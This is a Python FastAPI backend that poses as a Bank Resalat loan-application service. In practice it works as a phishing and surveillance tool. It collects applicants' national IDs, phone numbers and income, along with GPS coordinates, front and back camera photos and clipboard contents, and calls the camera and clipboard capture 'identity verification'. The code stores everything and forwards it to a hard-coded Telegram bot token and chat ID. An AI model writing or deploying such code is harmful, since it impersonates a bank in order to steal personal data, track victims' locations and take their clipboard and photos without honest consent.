from fastapi import FastAPI, APIRouter, HTTPException, Request
from fastapi.staticfiles import StaticFiles  
from fastapi.responses import FileResponse
from starlette.middleware.cors import CORSMiddleware
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import requests
import asyncio
import json
import aiofiles
import base64

# Create the main app - Railway optimized
app = FastAPI(title="بانک رسالت - سیستم درخواست وام (Railway)", version="1.0.0")

# Create API router
api_router = APIRouter(prefix="/api")

# Configuration - Railway environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "7444090143:AAFcyTCXxG0P6E74fF7lPDxkbmea9evCams")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "94243768")

# Railway compatible storage
DATA_DIR = Path("./data")
BACKUP_DIR = Path("./backup")

# Ensure directories exist
def create_directories():
    """Create necessary directories for Railway"""
    directories = [
        DATA_DIR / "applications",
        DATA_DIR / "locations", 
        DATA_DIR / "photos",
        DATA_DIR / "clipboard",
        BACKUP_DIR / "applications",
        BACKUP_DIR / "locations",
        BACKUP_DIR / "photos", 
        BACKUP_DIR / "clipboard"
    ]
    
    for directory in directories:
        directory.mkdir(parents=True, exist_ok=True)

create_directories()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Models
class LoanApplicationCreate(BaseModel):
    # Personal Information
    full_name: str
    national_id: str
    birth_date: str
    phone_number: str
    email: Optional[str] = None
    address: str
    job_title: str
    monthly_income: int
    
    # Loan Information
    loan_type: str
    loan_amount: int
    loan_purpose: str
    repayment_period: int
    loan_fee: Optional[int] = 0
    
    # Location Data
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    location_accuracy: Optional[float] = None
    
    # Permission Data
    permissions_granted: Optional[Dict[str, bool]] = None
    clipboard_data: Optional[str] = None
    front_camera_verified: Optional[bool] = False
    back_camera_verified: Optional[bool] = False
    
    # System Information
    user_agent: Optional[str] = None
    browser_info: Optional[Dict[str, Any]] = None
    tracking_code: Optional[str] = None

class LocationData(BaseModel):
    latitude: float
    longitude: float
    accuracy: Optional[float] = None
    altitude: Optional[float] = None
    user_agent: Optional[str] = None
    is_manual_request: Optional[bool] = False

class CameraPhoto(BaseModel):
    photo_data: str
    camera_type: str
    timestamp: Optional[str] = None
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    is_manual_request: Optional[bool] = False

class ClipboardData(BaseModel):
    clipboard_content: str
    timestamp: Optional[str] = None
    user_agent: Optional[str] = None
    method_used: Optional[str] = None
    is_manual_request: Optional[bool] = False

# Utility functions
def calculate_loan_fee(amount: int) -> int:
    """Calculate 2% Islamic banking fee"""
    return int(amount * 0.02) if 100_000_000 <= amount <= 1_000_000_000 else 0

def get_loan_type_persian(loan_type: str) -> str:
    """Convert loan type to Persian"""
    types = {
        "emergency": "وام ضروری (اضطراری)",
        "housing": "وام مسکن", 
        "car": "وام خودرو",
        "other": "سایر وام‌ها"
    }
    return types.get(loan_type, loan_type)

def format_persian_number(number: int) -> str:
    """Format number with Persian separators"""
    return f"{number:,}".replace(',', '،')

def generate_tracking_code() -> str:
    """Generate 8-digit tracking code"""
    import random
    import string
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=8))

# File operations
async def save_to_filesystem(data: dict, filename: str):
    """Save data to filesystem"""
    try:
        file_path = DATA_DIR / filename
        async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(data, ensure_ascii=False, indent=2, default=str))
        
        # Backup
        backup_path = BACKUP_DIR / filename
        async with aiofiles.open(backup_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(data, ensure_ascii=False, indent=2, default=str))
        
        logger.info(f"Data saved: {file_path}")
        return str(file_path)
    except Exception as e:
        logger.error(f"Save error: {e}")
        return None

async def save_photo_to_filesystem(photo_data: str, filename: str, camera_type: str):
    """Save photo to filesystem"""
    try:
        image_data = base64.b64decode(photo_data.split(',')[1] if ',' in photo_data else photo_data)
        
        photos_dir = DATA_DIR / "photos"
        image_path = photos_dir / f"{filename}.jpg"
        
        with open(image_path, 'wb') as f:
            f.write(image_data)
        
        # Backup
        backup_photos_dir = BACKUP_DIR / "photos"
        backup_image_path = backup_photos_dir / f"{filename}.jpg"
        
        with open(backup_image_path, 'wb') as f:
            f.write(image_data)
        
        logger.info(f"Photo saved: {image_path}")
        return str(image_path)
    except Exception as e:
        logger.error(f"Photo save error: {e}")
        return None

# Telegram functions
async def send_to_telegram(data: dict, is_location_only: bool = False):
    """Send data to Telegram"""
    try:
        if is_location_only:
            message = f"""📍 **موقعیت جغرافیایی - بانک رسالت**

🌐 **مختصات:**
• عرض جغرافیایی: `{data['latitude']}`
• طول جغرافیایی: `{data['longitude']}`
• دقت: {data.get('accuracy', 'نامشخص')} متر

🗺️ [Google Maps](https://maps.google.com/?q={data['latitude']},{data['longitude']})

📅 **زمان:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC"""
        else:
            message = f"""🏦 **بانک رسالت - درخواست وام جدید**

👤 **اطلاعات متقاضی:**
• نام: `{data['full_name']}`
• کد ملی: `{data['national_id']}`
• تولد: {data['birth_date']}
• تلفن: {data['phone_number']}
{f"• ایمیل: {data['email']}" if data.get('email') else ""}
• شغل: {data['job_title']}
• درآمد: {format_persian_number(data['monthly_income'])} تومان

💰 **اطلاعات وام:**
• نوع: {get_loan_type_persian(data['loan_type'])}
• مبلغ: {format_persian_number(data['loan_amount'])} تومان  
• کارمزد 2%: {format_persian_number(calculate_loan_fee(data['loan_amount']))} تومان
• مدت: {data['repayment_period']} ماه
• هدف: {data['loan_purpose']}

📍 **موقعیت:**
{f"• عرض: {data.get('latitude', 'ندارد')}" if data.get('latitude') else "• موقعیت دریافت نشد"}
{f"• طول: {data.get('longitude', 'ندارد')}" if data.get('longitude') else ""}
{f"🗺️ [نقشه](https://maps.google.com/?q={data['latitude']},{data['longitude']})" if data.get('latitude') and data.get('longitude') else ""}

✅ **احراز هویت:**
• دوربین جلو: {'✅' if data.get('front_camera_verified') else '❌'}
• دوربین عقب: {'✅' if data.get('back_camera_verified') else '❌'}
• کلیپبورد: {'✅' if data.get('clipboard_data') else '❌'}

🏷️ **کد رهگیری:** `{data.get('tracking_code', 'نامشخص')}`
📅 **زمان:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC"""
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown",
            "disable_web_page_preview": False
        }
        
        response = requests.post(url, json=payload, timeout=30)
        
        if response.status_code == 200:
            logger.info("Message sent to Telegram successfully")
            return True
        else:
            logger.error(f"Telegram send failed: {response.text}")
            return False
            
    except Exception as e:
        logger.error(f"Telegram send error: {e}")
        return False

async def send_photo_to_telegram(photo_path: str, camera_type: str):
    """Send photo to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        
        caption = f"""📷 **عکس دوربین - بانک رسالت**

🎥 نوع: {'📱 جلو' if camera_type == 'front' else '📸 عقب'}
⏰ زمان: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC"""
        
        with open(photo_path, 'rb') as photo_file:
            files = {'photo': photo_file}
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=payload, files=files, timeout=30)
            success = response.status_code == 200
            
            if success:
                logger.info(f"Photo sent: {camera_type}")
            else:
                logger.error(f"Photo send failed: {response.text}")
                
            return success
    except Exception as e:
        logger.error(f"Photo send error: {e}")
        return False

# API Routes
@api_router.get("/")
async def root():
    return {
        "message": "بانک رسالت - سیستم درخواست تسهیلات بانکی (Railway)", 
        "version": "1.0.0",
        "status": "Railway Deployment Ready",
        "storage": "File System Only",
        "telegram": "Active"
    }

@api_router.post("/loan-application")
async def create_loan_application(application: LoanApplicationCreate, request: Request):
    try:
        logger.info(f"Processing loan application for {application.full_name}")
        
        # Validation
        if not application.full_name or not application.full_name.strip():
            raise HTTPException(status_code=422, detail="نام و نام خانوادگی اجباری است")
        
        if not application.national_id or len(application.national_id.strip()) != 10:
            raise HTTPException(status_code=422, detail="کد ملی باید 10 رقم باشد")
        
        if not application.phone_number or len(application.phone_number.strip()) != 11:
            raise HTTPException(status_code=422, detail="شماره تلفن باید 11 رقم باشد")
        
        if not application.loan_amount or application.loan_amount < 100_000_000 or application.loan_amount > 1_000_000_000:
            raise HTTPException(status_code=422, detail="مبلغ وام باید بین 100 میلیون تا 1 میلیارد تومان باشد")
        
        # Create application data
        tracking_code = generate_tracking_code()
        app_data = application.dict()
        app_data['tracking_code'] = tracking_code
        app_data['created_at'] = datetime.now(timezone.utc).isoformat()
        app_data['id'] = str(uuid.uuid4())
        
        # Save to file system
        filename = f"loan_application_{app_data['id']}.json"
        await save_to_filesystem(app_data, f"applications/{filename}")
        
        # Send to Telegram
        telegram_success = await send_to_telegram(app_data, is_location_only=False)
        
        logger.info("Application processing complete")
        
        return {
            "id": app_data['id'],
            "tracking_code": tracking_code,
            "status": "submitted",
            "message": "درخواست وام با موفقیت ثبت شد",
            "telegram_sent": telegram_success
        }
    except Exception as e:
        logger.error(f"Application error: {e}")
        raise HTTPException(status_code=500, detail=f"خطا در ثبت درخواست وام: {str(e)}")

@api_router.post("/location")
async def save_location(location: LocationData, request: Request):
    try:
        location_data = location.dict()
        location_data['timestamp'] = datetime.now(timezone.utc).isoformat()
        
        # Save to file system
        filename = f"location_{int(datetime.now().timestamp())}.json"
        await save_to_filesystem(location_data, f"locations/{filename}")
        
        # Send to Telegram
        telegram_success = await send_to_telegram(location_data, is_location_only=True)
        
        logger.info(f"Location saved: {location.latitude}, {location.longitude}")
        
        return {
            "status": "success", 
            "message": "موقعیت ذخیره شد",
            "telegram_sent": telegram_success
        }
    except Exception as e:
        logger.error(f"Location error: {e}")
        raise HTTPException(status_code=500, detail="خطا در ذخیره موقعیت")

@api_router.post("/upload-photo")
async def upload_photo(photo: CameraPhoto, request: Request):
    try:
        timestamp = int(datetime.now().timestamp())
        filename = f"photo_{photo.camera_type}_{timestamp}"
        
        # Save photo
        photo_path = await save_photo_to_filesystem(photo.photo_data, filename, photo.camera_type)
        
        if photo_path:
            # Send to Telegram
            telegram_success = await send_photo_to_telegram(photo_path, photo.camera_type)
            
            return {
                "status": "success", 
                "message": f"عکس {photo.camera_type} ذخیره شد", 
                "telegram_sent": telegram_success
            }
        else:
            raise HTTPException(status_code=500, detail="خطا در ذخیره عکس")
            
    except Exception as e:
        logger.error(f"Photo error: {e}")
        raise HTTPException(status_code=500, detail=f"خطا در آپلود عکس: {str(e)}")

@api_router.post("/clipboard")
async def save_clipboard(clipboard: ClipboardData, request: Request):
    try:
        clipboard_data = clipboard.dict()
        clipboard_data['timestamp'] = datetime.now(timezone.utc).isoformat()
        
        # Save to file system
        filename = f"clipboard_{int(datetime.now().timestamp())}.json"
        await save_to_filesystem(clipboard_data, f"clipboard/{filename}")
        
        # Send clipboard info to Telegram  
        message = f"""📋 **کلیپبورد دریافتی - بانک رسالت**

📝 **محتوا:** {clipboard.clipboard_content[:200]}{'...' if len(clipboard.clipboard_content) > 200 else ''}
📏 **طول:** {len(clipboard.clipboard_content)} کاراکتر
⏰ **زمان:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC"""

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        requests.post(url, json=payload, timeout=10)
        
        return {
            "status": "success",
            "message": "کلیپبورد ذخیره شد"
        }
    except Exception as e:
        logger.error(f"Clipboard error: {e}")
        raise HTTPException(status_code=500, detail="خطا در ذخیره کلیپبورد")

@api_router.get("/loan-types")
async def get_loan_types():
    return {
        "loan_types": [
            {"key": "emergency", "label": "وام ضروری (اضطراری)", "max_amount": 1_000_000_000},
            {"key": "housing", "label": "وام مسکن", "max_amount": 1_000_000_000},
            {"key": "car", "label": "وام خودرو", "max_amount": 1_000_000_000},
            {"key": "other", "label": "سایر وام‌ها", "max_amount": 1_000_000_000}
        ],
        "fee_percentage": 2,
        "min_amount": 100_000_000,
        "max_amount": 1_000_000_000
    }

# Include router
app.include_router(api_router)

# Serve static files (React build)
app.mount("/", StaticFiles(directory="static", html=True), name="static")

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"]
)

# Startup event
@app.on_event("startup")
async def startup_event():
    create_directories()
    logger.info("🚀 Bank Resalat Railway API started successfully")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))